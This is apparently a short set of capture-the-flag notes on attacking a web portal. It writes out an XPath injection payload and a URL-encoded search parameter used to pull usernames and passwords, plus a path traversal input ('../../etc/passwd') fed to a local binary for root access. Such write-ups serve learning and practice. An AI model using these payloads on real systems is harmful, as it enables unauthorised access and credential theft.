on log in ==use domain email== and access the page

otherwise we cant access it portal.php

playing with the parameters we found a error ==XPATH..xml error==

so we found

`')] | //user/*[contains(*,'`

and it gave us ==6 blank fields== so we knew it work but not giving passwords

main idea of this exploit is to get username and passwords

we used ==url converted versino== for it

```
work=%27)%5D/password%20%7C%20a%5Bcontains(a,%27&action=search 
```

semi converted .. it only works

for root it was binary exploitation

```
$ ./get-list
Which List do you want to open? [customers/employees]: ../../etc/passwd #employees
```
